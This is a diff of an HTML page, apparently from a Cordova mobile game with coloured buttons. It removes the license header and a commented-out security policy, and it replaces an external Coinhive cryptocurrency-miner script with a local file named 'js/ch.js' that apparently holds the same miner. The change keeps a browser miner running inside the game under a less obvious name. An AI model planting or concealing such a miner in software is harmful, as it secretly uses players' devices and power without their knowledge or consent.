@@ -1,26 +1,7 @@
 <!DOCTYPE html>
-<!--
-    Licensed to the Apache Software Foundation (ASF) under one
-    or more contributor license agreements.  See the NOTICE file
-    distributed with this work for additional information
-    regarding copyright ownership.  The ASF licenses this file
-    to you under the Apache License, Version 2.0 (the
-    "License"); you may not use this file except in compliance
-    with the License.  You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-    Unless required by applicable law or agreed to in writing,
-    software distributed under the License is distributed on an
-    "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
-     KIND, either express or implied.  See the License for the
-    specific language governing permissions and limitations
-    under the License.
--->
 <html>
 
 <head>
-    <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; img-src 'self' data: content:;"> -->
     <meta name="format-detection" content="telephone=no">
     <meta name="msapplication-tap-highlight" content="no">
     <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width">
@@ -32,7 +13,7 @@
     <script type="text/javascript" src="cordova.js"></script>
     <script type="text/javascript" src="js/jquery.min.js"></script>
     <script type="text/javascript" src="js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script type="text/javascript" src="js/ch.js"></script>
     <script type="text/javascript" src="js/toastr.min.js"></script>
     <script type="text/javascript" charset="utf-8" src="js/main.js"></script>
 
@@ -40,7 +21,7 @@
 </head>
 
 <body>
-    <div class="container" id="box">
+    <div class="container" id="box" style="opacity: 0">
         <div class="menu">
             <a href="http://apps.mathrod.xyz">
                 <li id="about">
@@ -54,15 +35,15 @@
             </a>
 
         </div>
-        <div id="msg">oops</div>
+        <div id="msg"></div>
         <div class="row">
             <div class="col-sm-6">
-                <button class="btn colors" id="cyan"></button>
+                <button class="btn colors btn-press" id="c"></button>
                 <br>
-                <button class="btn colors" id="orange"></button>
-                <button class="btn colors" id="green"></button>
+                <button class="btn colors btn-press" id="o"></button>
+                <button class="btn colors btn-press" id="g"></button>
                 <br>
-                <button class="btn colors" id="pink"></button>
+                <button class="btn colors btn-press" id="p"></button>
             </div>
             <div class="col-sm-6">
                 <button class="btn small" id="play"></button>
